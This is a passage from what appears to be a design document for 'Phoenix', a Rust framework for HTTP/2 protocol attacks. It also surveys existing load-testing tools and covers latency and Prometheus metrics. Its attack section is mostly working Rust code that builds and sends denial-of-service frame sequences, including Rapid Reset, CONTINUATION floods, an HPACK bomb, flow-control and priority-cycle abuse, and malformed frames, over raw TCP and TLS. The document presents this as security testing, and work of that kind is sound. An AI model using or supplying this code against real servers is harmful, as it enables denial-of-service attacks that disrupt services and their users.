        self.build_frame(PING, 0x00, 0, &opaque_data.to_be_bytes())
    }
    
    fn build_goaway_frame(&mut self, last_stream_id: u32, error_code: u32, debug_data: &[u8]) -> &[u8] {
        let mut payload = Vec::with_capacity(8 + debug_data.len());
        payload.extend(&last_stream_id.to_be_bytes());
        payload.extend(&error_code.to_be_bytes());
        payload.extend(debug_data);
        self.build_frame(GOAWAY, 0x00, 0, &payload)
    }
    
    fn build_window_update_frame(&mut self, stream_id: u32, increment: u32) -> &[u8] {
        // RFC 7540: Window size increment must be 1 to 2^31-1
        let increment = increment & 0x7FFFFFFF;
        self.build_frame(WINDOW_UPDATE, 0x00, stream_id, &increment.to_be_bytes())
    }
    
    fn build_continuation_frame(&mut self, stream_id: u32, headers: &[u8], end_headers: bool) -> &[u8] {
        let flags = if end_headers { 0x04 } else { 0x00 };
        self.build_frame(CONTINUATION, flags, stream_id, headers)
    }
}
```

### Attack-Specific Frame Builders

#### 1. **Rapid Reset Attack Frames**
```rust
impl RawFrameBuilder {
    fn build_rapid_reset_sequence(&mut self, base_stream_id: u32, count: usize) -> Vec<Vec<u8>> {
        let mut frames = Vec::with_capacity(count * 2);
        
        for i in 0..count {
            let stream_id = base_stream_id + (i as u32) * 2;
            
            // HEADERS frame to open stream
            let headers = self.build_headers_frame(stream_id, b"", false, true);
            frames.push(headers.to_vec());
            
            // RST_STREAM frame to immediately close it
            let rst = self.build_rst_stream_frame(stream_id, 0x08); // CANCEL error
            frames.push(rst.to_vec());
        }
        
        frames
    }
    
    fn build_rapid_reset_burst(&mut self, stream_ids: &[u32]) -> Vec<Vec<u8>> {
        let mut frames = Vec::with_capacity(stream_ids.len() * 2);
        
        for &stream_id in stream_ids {
            // Open and immediately reset each stream
            frames.push(self.build_headers_frame(stream_id, b"", false, true).to_vec());
            frames.push(self.build_rst_stream_frame(stream_id, 0x08).to_vec());
        }
        
        frames
    }
}
```

#### 2. **Continuation Flood Frames**
```rust
impl RawFrameBuilder {
    fn build_continuation_flood(&mut self, stream_id: u32, fragment_size: usize, fragment_count: usize) -> Vec<Vec<u8>> {
        let mut frames = Vec::with_capacity(fragment_count + 2);
        
        // Initial HEADERS frame without END_HEADERS flag
        let initial_headers = vec![0u8; fragment_size];
        frames.push(
            self.build_headers_frame(stream_id, &initial_headers, false, false)
                .to_vec()
        );
        
        // Many CONTINUATION frames
        for i in 0..fragment_count {
            let fragment = vec![i as u8; fragment_size];
            let end_headers = i == fragment_count - 1;
            frames.push(
                self.build_continuation_frame(stream_id, &fragment, end_headers)
                    .to_vec()
            );
        }
        
        frames
    }
    
    fn build_hpack_bomb(&mut self, stream_id: u32, header_count: usize) -> Vec<u8> {
        // Build HPACK-encoded headers that expand massively when decoded
        let mut hpack_data = BytesMut::new();
        
        // Add many duplicate header entries to fill dynamic table
        for i in 0..header_count {
            // Literal header field with incremental indexing
            hpack_data.put_u8(0x40); // Pattern: 01000000
            
            // Header name length (7 with Huffman)
            hpack_data.put_u8(0x87); // 10000111
            
            // Header name: "x-custom-" + index
            let name = format!("x-custom-{}", i);
            hpack_data.extend(name.as_bytes());
            
            // Header value length (large)
            hpack_data.put_u8(0x7F); // 127 with continuation
            hpack_data.put_u8(0x00); // Continuation byte
            
            // Large value to fill table
            let value = "A".repeat(4096);
            hpack_data.extend(value.as_bytes());
        }
        
        self.build_headers_frame(stream_id, &hpack_data, false, true).to_vec()
    }
}
```

#### 3. **Flow Control Attack Frames**
```rust
impl RawFrameBuilder {
    fn build_window_overflow_attack(&mut self, stream_id: u32) -> Vec<Vec<u8>> {
        let mut frames = Vec::new();
        
        // Send WINDOW_UPDATE with maximum increment (2^31-1)
        let max_increment = 0x7FFFFFFF;
        frames.push(
            self.build_window_update_frame(stream_id, max_increment).to_vec()
        );
        
        // Send DATA frames to consume the window
        let data_chunk = vec![0u8; 16384]; // 16KB chunks
        for _ in 0..(max_increment as usize / 16384) {
            frames.push(
                self.build_data_frame(stream_id, &data_chunk, false).to_vec()
            );
        }
        
        frames
    }
    
    fn build_zero_window_attack(&mut self, stream_id: u32) -> Vec<Vec<u8>> {
        // Set window size to 0, then send data
        let mut frames = Vec::new();
        
        // WINDOW_UPDATE with 0 increment (invalid per RFC but some implementations accept)
        frames.push(self.build_window_update_frame(stream_id, 0).to_vec());
        
        // Try to send data anyway
        frames.push(
            self.build_data_frame(stream_id, b"test data", false).to_vec()
        );
        
        frames
    }
}
```

#### 4. **Priority Attack Frames**
```rust
impl RawFrameBuilder {
    fn build_priority_cycle(&mut self, stream_ids: &[u32]) -> Vec<Vec<u8>> {
        // Create circular dependency that might confuse implementations
        let mut frames = Vec::with_capacity(stream_ids.len());
        
        for (i, &stream_id) in stream_ids.iter().enumerate() {
            let dependent_stream_id = if i == stream_ids.len() - 1 {
                stream_ids[0]
            } else {
                stream_ids[i + 1]
            };
            
            // Build PRIORITY frame
            let mut payload = [0u8; 5];
            payload[0..4].copy_from_slice(&dependent_stream_id.to_be_bytes());
            payload[4] = 255; // Maximum weight
            
            frames.push(self.build_frame(PRIORITY, 0x00, stream_id, &payload).to_vec());
        }
        
        frames
    }
    
    fn build_self_dependency(&mut self, stream_id: u32) -> Vec<u8> {
        // Stream depending on itself (invalid per RFC)
        let mut payload = [0u8; 5];
        payload[0..4].copy_from_slice(&stream_id.to_be_bytes());
        payload[4] = 16;
        
        self.build_frame(PRIORITY, 0x00, stream_id, &payload).to_vec()
    }
}
```

### Sending Raw Frames Over TcpStream

#### Basic Raw Connection Handler
```rust
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use tokio::net::TcpStream;

struct RawHttp2Connection {
    stream: TcpStream,
    frame_builder: RawFrameBuilder,
    next_stream_id: u32,
}

impl RawHttp2Connection {
    async fn connect(host: &str, port: u16) -> Result<Self, Box<dyn std::error::Error>> {
        let stream = TcpStream::connect((host, port)).await?;
        
        Ok(Self {
            stream,
            frame_builder: RawFrameBuilder::new(),
            next_stream_id: 1,
        })
    }
    
    async fn send_connection_preface(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // HTTP/2 connection preface
        let preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        self.stream.write_all(preface).await?;
        
        // Initial SETTINGS frame
        let settings = self.frame_builder.build_settings_frame(&[
            (0x1, 4096),    // SETTINGS_HEADER_TABLE_SIZE
            (0x2, 1),       // SETTINGS_ENABLE_PUSH
            (0x3, 100),     // SETTINGS_MAX_CONCURRENT_STREAMS
            (0x4, 65535),   // SETTINGS_INITIAL_WINDOW_SIZE
            (0x5, 16384),   // SETTINGS_MAX_FRAME_SIZE
            (0x6, 65535),   // SETTINGS_MAX_HEADER_LIST_SIZE
        ]);
        
        self.stream.write_all(settings).await?;
        
        // Send empty SETTINGS frame with ACK flag
        let settings_ack = self.frame_builder.build_frame(SETTINGS, 0x01, 0, b"");
        self.stream.write_all(settings_ack).await?;
        
        Ok(())
    }
    
    async fn send_raw_frame(&mut self, frame_type: u8, flags: u8, stream_id: u32, payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let frame = self.frame_builder.build_frame(frame_type, flags, stream_id, payload);
        self.stream.write_all(frame).await?;
        Ok(())
    }
    
    async fn send_attack_frames(&mut self, frames: &[Vec<u8>]) -> Result<(), Box<dyn std::error::Error>> {
        // Send frames as rapidly as possible
        for frame in frames {
            self.stream.write_all(frame).await?;
        }
        self.stream.flush().await?;
        Ok(())
    }
    
    async fn read_response(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut buffer = vec![0u8; 4096];
        let n = self.stream.read(&mut buffer).await?;
        buffer.truncate(n);
        Ok(buffer)
    }
    
    fn allocate_stream_id(&mut self) -> u32 {
        let id = self.next_stream_id;
        self.next_stream_id += 2; // Client-initiated streams are odd
        id
    }
}
```

#### TLS-Enabled Raw Connection
```rust
use tokio_rustls::client::TlsStream;

struct TlsRawHttp2Connection {
    stream: TlsStream<TcpStream>,
    frame_builder: RawFrameBuilder,
    next_stream_id: u32,
}

impl TlsRawHttp2Connection {
    async fn connect_tls(host: &str, port: u16) -> Result<Self, Box<dyn std::error::Error>> {
        let tls_stream = create_tls_h2_client(host, port).await?;
        
        Ok(Self {
            stream: tls_stream,
            frame_builder: RawFrameBuilder::new(),
            next_stream_id: 1,
        })
    }
    
    async fn send_raw_frame_tls(&mut self, frame_type: u8, flags: u8, stream_id: u32, payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let frame = self.frame_builder.build_frame(frame_type, flags, stream_id, payload);
        self.stream.write_all(frame).await?;
        Ok(())
    }
}
```

### Malformed Frame Generation

#### 1. **Invalid Frame Headers**
```rust
impl RawFrameBuilder {
    fn build_malformed_frame(&mut self) -> Vec<u8> {
        // Frame with invalid length (exceeds 2^24-1)
        let invalid_length = 0xFFFFFF + 1; // 16,777,216 (too large)
        
        let mut frame = Vec::new();
        frame.push((invalid_length >> 16) as u8);
        frame.push((invalid_length >> 8) as u8);
        frame.push(invalid_length as u8);
        frame.push(0x00); // DATA frame
        frame.push(0x00); // No flags
        frame.extend(&1u32.to_be_bytes()); // Stream 1
        // No payload (length says there should be)
        
        frame
    }
    
    fn build_reserved_bit_frame(&mut self, stream_id: u32) -> Vec<u8> {
        // Frame with reserved bit set in stream ID
        let mut frame = self.build_data_frame(stream_id, b"test", false).to_vec();
        
        // Set the reserved bit (bit 31)
        frame[5] |= 0x80; // Set high bit of first stream ID byte
        
        frame
    }
    
    fn build_unknown_frame_type(&mut self) -> Vec<u8> {
        // Frame with unknown type (0x0A-0xFD are unknown per RFC)
        self.build_frame(0xFA, 0x00, 1, b"unknown frame payload").to_vec()
    }
}
```

#### 2. **Invalid Stream States**
```rust
impl RawFrameBuilder {
    fn build_invalid_state_sequence(&mut self) -> Vec<Vec<u8>> {
        let mut frames = Vec::new();
        
        // Send RST_STREAM on idle stream (invalid)
        frames.push(self.build_rst_stream_frame(1, 0x08).to_vec());
        
        // Send DATA on stream 0 (connection-level, invalid)
        frames.push(self.build_data_frame(0, b"data on stream 0", false).to_vec());
        
        // Send HEADERS on closed stream
        frames.push(self.build_headers_frame(1, b"", false, true).to_vec());
        frames.push(self.build_rst_stream_frame(1, 0x08).to_vec());
        frames.push(self.build_headers_frame(1, b"", false, true).to_vec()); // Invalid!
        
        frames
    }
}
```

### Performance Optimization for Raw Frame Sending

#### 1. **Batch Frame Writing**
```rust
impl RawHttp2Connection {
    async fn send_frame_batch(&mut self, frames: &[Vec<u8>]) -> Result<(), Box<dyn std::error::Error>> {
        // Calculate total size
        let total_size: usize = frames.iter().map(|f| f.len()).sum();
        let mut buffer = BytesMut::with_capacity(total_size);
        
        // Concatenate all frames
        for frame in frames {
            buffer.extend_from_slice(frame);
        }
        
        // Single write operation
        self.stream.write_all(&buffer).await?;
        self.stream.flush().await?;
        
        Ok(())
    }
}
```

#### 2. **Zero-Copy Frame Building**
```rust
struct ZeroCopyFrameBuilder<'a> {
    buffer: &'a mut BytesMut,
}

impl<'a> ZeroCopyFrameBuilder<'a> {
    fn new(buffer: &'a mut BytesMut) -> Self {
        Self { buffer }
    }
    
    fn build_frame(&mut self, frame_type: u8, flags: u8, stream_id: u32, payload: &[u8]) {
        let start_len = self.buffer.len();
        
        // Reserve space for header
        self.buffer.reserve(9 + payload.len());
        
        // Write length (will fill later)
        self.buffer.put_u8(0);
        self.buffer.put_u8(0);
        self.buffer.put_u8(0);
        
        // Write type, flags, stream ID
        self.buffer.put_u8(frame_type);
        self.buffer.put_u8(flags);
        self.buffer.put_u32(stream_id);
        
        // Write payload
        self.buffer.extend_from_slice(payload);
        
        // Now fill in the length
        let frame_len = self.buffer.len() - start_len - 9;
        let length_bytes = (frame_len as u32).to_be_bytes();
        self.buffer[start_len] = length_bytes[1];
        self.buffer[start_len + 1] = length_bytes[2];
        self.buffer[start_len + 2] = length_bytes[3];
    }
}
```

### Testing Raw Frame Implementation

#### Unit Tests
```rust
#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_frame_header_encoding() {
        let mut builder = RawFrameBuilder::new();
        let frame = builder.build_data_frame(1, b"hello", true);
        
        assert_eq!(frame.len(), 9 + 5); // Header + payload
        assert_eq!(frame[3], DATA); // Frame type
        assert_eq!(frame[4], 0x01); // END_STREAM flag
        assert_eq!(&frame[9..], b"hello");
    }
    
    #[test]
    fn test_rapid_reset_sequence() {
        let mut builder = RawFrameBuilder::new();
        let frames = builder.build_rapid_reset_sequence(1, 10);
        
        assert_eq!(frames.len(), 20); // 10 HEADERS + 10 RST_STREAM
        for (i, frame) in frames.iter().enumerate() {
            if i % 2 == 0 {
                assert_eq!(frame[3], HEADERS);
            } else {
                assert_eq!(frame[3], RST_STREAM);
            }
        }
    }
    
    #[test]
    fn test_continuation_flood() {
        let mut builder = RawFrameBuilder::new();
        let frames = builder.build_continuation_flood(1, 100, 1000);
        
        assert_eq!(frames.len(), 1001); // 1 HEADERS + 1000 CONTINUATION
        assert_eq!(frames[0][3], HEADERS);
        assert_eq!(frames[0][4], 0x00); // No END_HEADERS
        
        for frame in &frames[1..] {
            assert_eq!(frame[3], CONTINUATION);
        }
        
        // Last CONTINUATION should have END_HEADERS
        assert_eq!(frames.last().unwrap()[4], 0x04);
    }
}
```

### Integration with Phoenix Framework

The raw frame building layer should be the foundation of Phoenix's attack modules:

```rust
// Phoenix attack module architecture
pub mod attacks {
    pub mod rapid_reset;
    pub mod continuation_flood;
    pub mod flow_control;
    pub mod priority_attack;
    pub mod malformed_frames;
}

// Each attack module uses RawFrameBuilder
pub struct RapidResetAttack {
    frame_builder: RawFrameBuilder,
    connection: RawHttp2Connection,
}

impl RapidResetAttack {
    pub async fn execute(&mut self, target_streams: usize) -> Result<AttackResult, AttackError> {
        let frames = self.frame_builder.build_rapid_reset_sequence(1, target_streams);
        self.connection.send_attack_frames(&frames).await?;
        
        // Monitor response/behavior
        Ok(AttackResult::success())
    }
}
```

---

## 6. Existing Rust HTTP/2 Stress Tools {#existing-tools}

### Analysis of Current Rust HTTP/2 Benchmarking Tools

#### 1. **rewrk - Modern HTTP Benchmarking Tool**
**Repository**: https://github.com/ChillFish8/rewrk  
**Description**: A modern HTTP benchmarking tool written in Rust, supporting HTTP/1.1 and HTTP/2.

**Architecture**:
```rust
// Simplified rewrk architecture
struct RewrkBenchmark {
    client: HyperClient,
    config: BenchmarkConfig,
    statistics: StatisticsCollector,
}

impl RewrkBenchmark {
    async fn run(&mut self) {
        let mut tasks = JoinSet::new();
        
        for _ in 0..self.config.connections {
            let client = self.client.clone();
            let url = self.config.url.clone();
            
            tasks.spawn(async move {
                loop {
                    let start = Instant::now();
                    let response = client.get(&url).await;
                    let duration = start.elapsed();
                    
                    // Record statistics
                    record_latency(duration);
                }
            });
        }
    }
}
```

**Features**:
- HTTP/1.1 and HTTP/2 support via hyper
- Connection pooling
- Latency percentiles (p50, p95, p99)
- Request rate limiting
- JSON output format

**Limitations for Phoenix**:
- Uses hyper (high-level, validated HTTP)
- No raw frame access
- No attack capabilities
- Limited protocol manipulation

#### 2. **oha - HTTP Load Generator**
**Repository**: https://github.com/hatoo/oha  
**Description**: Ohayou (oha) is a tiny program that sends some load to a web application.

**Key Features**:
- HTTP/1.1 and HTTP/2 support
- Real-time terminal UI
- JSON output
- WebSocket support
- Custom headers and body

**Architecture**:
```rust
// oha uses reqwest with HTTP/2 support
let client = reqwest::Client::builder()
    .http2_prior_knowledge()
    .build()?;
```

**Limitations**:
- Built on reqwest (which uses hyper)
- No low-level control
- Focused on legitimate benchmarking

#### 3. **drill - HTTP Load Testing Application**
**Repository**: https://github.com/fcsonline/drill  
**Description**: Drill is a HTTP load testing application written in Rust inspired by Ansible syntax.

**Unique Features**:
- YAML-based scenario definitions
- Variable substitution
- Assertions on responses
- Think time between requests

**Example Scenario**:
```yaml
plan:
  - name: "HTTP/2 test"
    requests:
      - name: "Get homepage"
        url: "https://example.com"
        http2: true
        headers:
          User-Agent: "Drill/0.8"
```

**Limitations**:
- Scenario-focused, not attack-focused
- Uses reqwest/hyper stack
- No protocol-level attacks

#### 4. **divan - Benchmarking Library**
**Repository**: https://github.com/nvzqz/divan  
**Description**: A Rust benchmarking library that provides statistical analysis.

**Features**:
- Statistical significance testing
- Outlier detection
- Comparison between benchmarks
- CSV/JSON output

**Usage**:
```rust
#[divan::bench]
fn http2_request(bencher: divan::Bencher) {
    let client = Client::new();
    
    bencher.bench(|| {
        client.get("https://example.com").send()
    });
}
```

**Limitations**:
- Library, not a tool
- No network-level control
- Focused on microbenchmarks

### h2load (nghttp2) - Reference Implementation

**Language**: C (not Rust)  
**Repository**: https://github.com/nghttp2/nghttp2

**Architecture**:
- Direct nghttp2 library usage
- Raw frame-level control (in C)
- Extensive attack surface testing
- Used for CVE-2023-44487 (Rapid Reset) testing

**Key Features Phoenix Should Emulate**:
1. **Raw protocol access** - Direct nghttp2 session control
2. **Frame-level manipulation** - Custom frame sequences
3. **Performance metrics** - Detailed timing statistics
4. **Concurrent stream testing** - Max stream limits

### wrk2 - HDR Histogram Approach

**Language**: C (not Rust)  
**Repository**: https://github.com/giltene/wrk2

**Key Innovation**: Uses HDR Histogram for accurate latency measurement at high percentiles (p99.9, p99.99, p99.999).

**Architecture**:
- Custom HTTP/1.1 client in C
- HDR Histogram for latency tracking
- Constant throughput mode
- Detailed latency distribution

**Relevant for Phoenix**:
- HDR histogram implementation in Rust (`hdrhistogram` crate)
- Accurate high-percentile latency measurement
- Constant request rate mode

### What Phoenix Should Do Differently

#### 1. **Raw Protocol Access**
Unlike existing Rust tools that use hyper/reqwest, Phoenix needs:
- Direct TCP/TLS socket access
- Custom HTTP/2 frame building
- Protocol violation capabilities
- Bypass of standard validation

#### 2. **Attack-First Design**
Phoenix should be designed for security testing, not just benchmarking:
- Built-in attack modules (Rapid Reset, Continuation Flood, etc.)
- Malformed frame generation
- Protocol fuzzing capabilities
- Exploit proof-of-concepts

#### 3. **Extensible Architecture**
```rust
// Plugin-based attack modules
trait AttackModule {
    fn name(&self) -> &str;
    fn description(&self) -> &str;
    async fn execute(&self, target: &Target, config: &AttackConfig) -> AttackResult;
}

// Register attacks dynamically
struct PhoenixFramework {
    attacks: HashMap<String, Box<dyn AttackModule>>,
    metrics: MetricsCollector,
    ui: TerminalUI,
}

impl PhoenixFramework {
    fn register_attack(&mut self, name: String, attack: Box<dyn AttackModule>) {
        self.attacks.insert(name, attack);
    }
    
    async fn run_attack(&self, attack_name: &str, target: &Target) -> AttackResult {
        if let Some(attack) = self.attacks.get(attack_name) {
            attack.execute(target, &self.config).await
        } else {
            Err(AttackError::UnknownAttack)
        }
    }
}
```

#### 4. **Real-time Attack Dashboard**
Unlike simple terminal output, Phoenix needs:
- Real-time connection statistics
- Frame-by-frame visualization
- Attack effectiveness metrics
- Interactive attack control

#### 5. **Research and Documentation**
Phoenix should include:
- Detailed attack explanations
- RFC references
- Implementation vulnerabilities
- Mitigation strategies
- Academic references

---

## 7. Metrics and Monitoring in Rust {#metrics}

### Latency Measurement with HDR Histogram

#### hdrhistogram Crate
**Crate**: `hdrhistogram`  
**Version**: 8.0.0+  
**Features**: High Dynamic Range histograms for accurate latency measurement

**Basic Usage**:
```rust
use hdrhistogram::Histogram;

struct LatencyTracker {
    histogram: Histogram<u64>,
}

impl LatencyTracker {
    fn new() -> Self {
        // 1 nanosecond to 1 hour range, 3 significant figures
        let histogram = Histogram::new_with_bounds(1, 3_600_000_000_000, 3)
            .expect("valid histogram bounds");
        
        Self { histogram }
    }
    
    fn record_latency(&mut self, duration: std::time::Duration) {
        let nanos = duration.as_nanos() as u64;
        self.histogram.record(nanos).expect("value in range");
    }
    
    fn p50(&self) -> std::time::Duration {
        std::time::Duration::from_nanos(self.histogram.value_at_quantile(0.50))
    }
    
    fn p95(&self) -> std::time::Duration {
        std::time::Duration::from_nanos(self.histogram.value_at_quantile(0.95))
    }
    
    fn p99(&self) -> std::time::Duration {
        std::time::Duration::from_nanos(self.histogram.value_at_quantile(0.99))
    }
    
    fn p999(&self) -> std::time::Duration {
        std::time::Duration::from_nanos(self.histogram.value_at_quantile(0.999))
    }
    
    fn p9999(&self) -> std::time::Duration {
        std::time::Duration::from_nanos(self.histogram.value_at_quantile(0.9999))
    }
    
    fn p99999(&self) -> std::time::Duration {
        std::time::Duration::from_nanos(self.histogram.value_at_quantile(0.99999))
    }
}
```

#### Advanced HDR Histogram Features
```rust
use hdrhistogram::serialization::{Serializer, V2Serializer};
use std::io::Write;

impl LatencyTracker {
    fn save_to_file(&self, path: &str) -> Result<(), Box<dyn std::error::Error>> {
        let mut file = std::fs::File::create(path)?;
        let serializer = V2Serializer::new();
        serializer.serialize(&self.histogram, &mut file)?;
        Ok(())
    }
    
    fn load_from_file(path: &str) -> Result<Self, Box<dyn std::error::Error>> {
        let file = std::fs::File::open(path)?;
        let histogram = Histogram::decode(file)?;
        Ok(Self { histogram })
    }
    
    fn merge(&mut self, other: &Histogram<u64>) -> Result<(), Box<dyn std::error::Error>> {
        self.histogram.add(other)?;
        Ok(())
    }
    
    fn summary(&self) -> LatencySummary {
        LatencySummary {
            count: self.histogram.len(),
            min: std::time::Duration::from_nanos(self.histogram.min()),
            max: std::time::Duration::from_nanos(self.histogram.max()),
            mean: std::time::Duration::from_nanos(self.histogram.mean() as u64),
            stddev: std::time::Duration::from_nanos(self.histogram.stdev() as u64),
            p50: self.p50(),
            p95: self.p95(),
            p99: self.p99(),
            p999: self.p999(),
            p9999: self.p9999(),
        }
    }
}

#[derive(Debug, Clone)]
struct LatencySummary {
    count: u64,
    min: std::time::Duration,
    max: std::time::Duration,
    mean: std::time::Duration,
    stddev: std::time::Duration,
    p50: std::time::Duration,
    p95: std::time::Duration,
    p99: std::time::Duration,
    p999: std::time::Duration,
    p9999: std::time::Duration,
}
```

### Atomic Counters for High-Performance Metrics

#### Request Rate Counting
```rust
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

struct RequestMetrics {
    total_requests: AtomicU64,
    successful_requests: AtomicU64,
    failed_requests: AtomicU64,
    bytes_sent: AtomicU64,
    bytes_received: AtomicU64,
    start_time: Instant,
}

impl RequestMetrics {
    fn new() -> Self {
        Self {
            total_requests: AtomicU64::new(0),
            successful_requests: AtomicU64::new(0),
            failed_requests: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            bytes_received: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }
    
    fn record_request(&self, success: bool, sent_bytes: u64, received_bytes: u64) {
        self.total_requests.fetch_add(1, Ordering::Relaxed);
        
        if success {
            self.successful_requests.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_requests.fetch_add(1, Ordering::Relaxed);
        }
        
        self.bytes_sent.fetch_add(sent_bytes, Ordering::Relaxed);
        self.bytes_received.fetch_add(received_bytes, Ordering::Relaxed);
    }
    
    fn requests_per_second(&self) -> f64 {
        let total = self.total_requests.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        
        if elapsed > 0.0 {
            total as f64 / elapsed
        } else {
            0.0
        }
    }
    
    fn success_rate(&self) -> f64 {
        let total = self.total_requests.load(Ordering::Relaxed);
        let success = self.successful_requests.load(Ordering::Relaxed);
        
        if total > 0 {
            success as f64 / total as f64 * 100.0
        } else {
            0.0
        }
    }
    
    fn throughput_mbps(&self) -> f64 {
        let bytes = self.bytes_received.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        
        if elapsed > 0.0 {
            (bytes as f64 * 8.0) / (elapsed * 1_000_000.0)
        } else {
            0.0
        }
    }
}
```

#### Per-Connection Metrics
```rust
struct ConnectionMetrics {
    connection_id: u64,
    streams_opened: AtomicU64,
    streams_reset: AtomicU64,
    frames_sent: AtomicU64,
    frames_received: AtomicU64,
    errors: AtomicU64,
    latency_tracker: Mutex<LatencyTracker>,
}

impl ConnectionMetrics {
    fn new(connection_id: u64) -> Self {
        Self {
            connection_id,
            streams_opened: AtomicU64::new(0),
            streams_reset: AtomicU64::new(0),
            frames_sent: AtomicU64::new(0),
            frames_received: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            latency_tracker: Mutex::new(LatencyTracker::new()),
        }
    }
    
    fn record_stream_opened(&self) {
        self.streams_opened.fetch_add(1, Ordering::Relaxed);
    }
    
    fn record_stream_reset(&self) {
        self.streams_reset.fetch_add(1, Ordering::Relaxed);
    }
    
    fn record_frame_sent(&self, frame_type: u8) {
        self.frames_sent.fetch_add(1, Ordering::Relaxed);
        // Could also track by frame type
    }
    
    fn record_latency(&self, duration: Duration) {
        if let Ok(mut tracker) = self.latency_tracker.lock() {
            tracker.record_latency(duration);
        }
    }
    
    fn reset_rate(&self) -> f64 {
        let opened = self.streams_opened.load(Ordering::Relaxed);
        let reset = self.streams_reset.load(Ordering::Relaxed);
        
        if opened > 0 {
            reset as f64 / opened as f64 * 100.0
        } else {
            0.0
        }
    }
}
```

### metrics Crate for Prometheus Integration

**Crate**: `metrics` + `metrics-exporter-prometheus`  
**Versions**: metrics 0.22.0, metrics-exporter-prometheus 0.13.0

#### Basic Setup
```rust
use metrics::{counter, gauge, histogram};
use metrics_exporter_prometheus::PrometheusBuilder;

fn setup_metrics() -> Result<(), Box<dyn std::error::Error>> {
    let builder = PrometheusBuilder::new();
    builder.install()?;
    
    Ok(())
}

// Record metrics during attacks
struct AttackMetrics {
    attack_name: String,
}

impl AttackMetrics {
    fn record_attack_start(&self) {
        counter!("phoenix.attacks.started", 1, "attack" => self.attack_name.clone());
        gauge!("phoenix.attacks.active", 1.0, "attack" => self.attack_name.clone());
    }
    
    fn record_attack_complete(&self, success: bool, duration: Duration) {
        gauge!("phoenix.attacks.active", 0.0, "attack" => self.attack_name.clone());
        
        if success {
            counter!("phoenix.attacks.completed", 1, "attack" => self.attack_name.clone());
        } else {
            counter!("phoenix.attacks.failed", 1, "attack" => self.attack_name.clone());
        }
        
        histogram!("phoenix.attack.duration", duration.as_secs_f64(), "attack" => self.attack_name.clone());
    }
    
    fn record_frames_sent(&self, frame_type: &str, count: u64) {
        counter!("phoenix.frames.sent", count, 
            "attack" => self.attack_name.clone(),
            "frame_type" => frame_type.to_string()
        );
    }
    
    fn record_stream_created(&self, stream_id: u32) {
        counter!("phoenix.streams.created", 1,
            "attack" => self.attack_name.clone(),
            "stream_id" => stream_id.to_string()
        );
    }
    
    fn record_error(&self, error_type: &str) {
        counter!("phoenix.errors", 1,
            "attack" => self.attack_name.clone(),
            "error_type" => error_type.to_string()
        );
    }
}
```

#### Custom Metrics Registry
```rust
use metrics::{Key, Recorder, Unit};
use metrics_util::{AtomicBucket, Quantile, Summary};

struct PhoenixMetricsRecorder {
    latency_summaries: Mutex<HashMap<String, Summary>>,
    counters: Mutex<HashMap<String, AtomicU64>>,
    gauges: Mutex<HashMap<String, AtomicF64>>,
}

impl Recorder for PhoenixMetricsRecorder {
    fn register_counter(&self, key: &Key, _unit: Option<Unit>, _description: Option<&'static str>) {
        let name = key.name().to_string();
        let mut counters = self.counters.lock().unwrap();
        counters.entry(name).or_insert_with(AtomicU64::new);
    }
    
    fn register_gauge(&self, key: &Key, _unit: Option<Unit>, _description: Option<&'static str>) {
        let name = key.name().to_string();
        let mut gauges = self.gauges.lock().unwrap();
        gauges.entry(name).or_insert_with(AtomicF64::new);
    }
    
    fn register_histogram(&self, key: &Key, _unit: Option<Unit>, _description: Option<&'static str>) {
        let name = key.name().to_string();
        let mut summaries = self.latency_summaries.lock().unwrap();
        summaries.entry(name).or_insert_with(|| {
            Summary::with_defaults()
        });
    }
    
    fn increment_counter(&self, key: &Key, value: u64) {
        let name = key.name().to_string();
        if let Some(counter) = self.counters.lock().unwrap().get_mut(&name) {
            counter.fetch_add(value, Ordering::Relaxed);
        }
    }
    
    fn update_gauge(&self, key: &Key, value: f64) {
        let name = key.name().to_string();
        if let Some(gauge) = self.gauges.lock().unwrap().get_mut(&name) {
            gauge.store(value, Ordering::Relaxed);
        }
    }
    
    fn record_histogram(&self, key: &Key, value: f64) {
        let name = key.name().to_string();
        if let Some(summary) = self.latency_summaries.lock().unwrap().get_mut(&name) {
            summary.add(value);
        }
    }
}

impl PhoenixMetricsRecorder {
    fn new() -> Self {
        Self {
            latency_summaries: Mutex::new(HashMap::new()),
            counters: Mutex::new(HashMap::new()),
            gauges: Mutex::new(HashMap::new()),
        }
    }
    
    fn get_quantile(&self, metric_name: &str, quantile: f64) -> Option<f64> {
        let summaries = self.latency_summaries.lock().unwrap();
        summaries.get(metric_name).and_then(|summary| {
            summary.quantile(quantile)
        })
    }
    
    fn get_counter(&self, metric_name: &str) -> Option<u64> {
        let counters = self.counters.lock().unwrap();
        counters.get(metric_name).map(|c| c.load(Ordering::Relaxed))
    }
}
```

### Real-time Metrics Dashboard

#### In-Memory Metrics Storage
```rust
use dashmap::DashMap;
use std::time::{Duration, Instant};

struct RealTimeMetrics {
    // Connection metrics by connection ID
    connections: DashMap<u64, ConnectionMetrics>,
    
    // Attack metrics by attack name
    attacks: DashMap<String, AttackMetrics>,
    
    // Global statistics
    global: GlobalMetrics,
    
    // Time series data for charts
    time_series: TimeSeriesStore,
}

impl RealTimeMetrics {
    fn new() -> Self {
        Self {
            connections: DashMap::new(),
            attacks: DashMap::new(),
            global: GlobalMetrics::new(),
            time_series: TimeSeriesStore::new(),
        }
    }
    
    fn update_time_series(&self) {
        let now = Instant::now();
        
        // Record requests per second
        let rps = self.global.requests_per_second();
        self.time_series.record("requests_per_second", now, rps);
        
        // Record success rate
        let success_rate = self.global.success_rate();
        self.time_series.record("success_rate", now, success_rate);
        
        // Record active connections
        let active_connections = self.connections.len() as f64;
        self.time_series.record("active_connections", now, active_connections);
    }
    
    fn get_summary(&self) -> MetricsSummary {
